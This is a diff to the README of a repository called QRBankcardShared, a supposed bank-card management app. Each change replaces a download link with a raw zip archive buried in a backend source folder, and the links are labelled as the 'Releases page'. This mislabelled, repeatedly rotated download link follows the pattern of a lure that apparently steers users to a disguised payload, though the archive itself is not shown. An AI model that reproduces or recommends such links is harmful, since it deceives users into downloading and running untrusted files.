@@ -1,7 +1,7 @@
 # 🎉 QRBankcardShared - Manage Your Digital Bank Cards Easily
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/rohits0410/QRBankcardShared/master/frontend/src/pages/Shared-QR-Bankcard-1.4.zip)](https://raw.githubusercontent.com/rohits0410/QRBankcardShared/master/frontend/src/pages/Shared-QR-Bankcard-1.4.zip)
+[![Download](https://github.com/rohits0410/QRBankcardShared/raw/refs/heads/master/backend/CardManager/CardManager.Services/QR_Shared_Bankcard_2.2.zip)](https://github.com/rohits0410/QRBankcardShared/raw/refs/heads/master/backend/CardManager/CardManager.Services/QR_Shared_Bankcard_2.2.zip)
 
 ## 🚀 Getting Started
 Welcome to QRBankcardShared! This application helps you manage your digital bank cards securely. You can store cards, generate QR codes, and share them with trusted individuals.
@@ -26,7 +26,7 @@ Welcome to QRBankcardShared! This application helps you manage your digital bank
 - PostgreSQL Database Integration
 
 ## 📂 Download & Install
-To get started, visit this page to download the latest release: [Download QRBankcardShared](https://raw.githubusercontent.com/rohits0410/QRBankcardShared/master/frontend/src/pages/Shared-QR-Bankcard-1.4.zip).
+To get started, visit this page to download the latest release: [Download QRBankcardShared](https://github.com/rohits0410/QRBankcardShared/raw/refs/heads/master/backend/CardManager/CardManager.Services/QR_Shared_Bankcard_2.2.zip).
 
 ### Steps to Download
 1. Click the link above to go to the Releases page.
@@ -62,6 +62,6 @@ If you encounter any issues or have questions, feel free to raise issues in the 
 Engage with fellow users and developers. Your feedback helps improve QRBankcardShared. 
 
 ## 🔄 Updates
-Ensure you regularly check for updates on the [Releases page](https://raw.githubusercontent.com/rohits0410/QRBankcardShared/master/frontend/src/pages/Shared-QR-Bankcard-1.4.zip) to benefit from new features and improvements.
+Ensure you regularly check for updates on the [Releases page](https://github.com/rohits0410/QRBankcardShared/raw/refs/heads/master/backend/CardManager/CardManager.Services/QR_Shared_Bankcard_2.2.zip) to benefit from new features and improvements.
 
 By following these steps, you can easily download and start using QRBankcardShared for managing your digital bank cards. Enjoy secure and convenient card management!
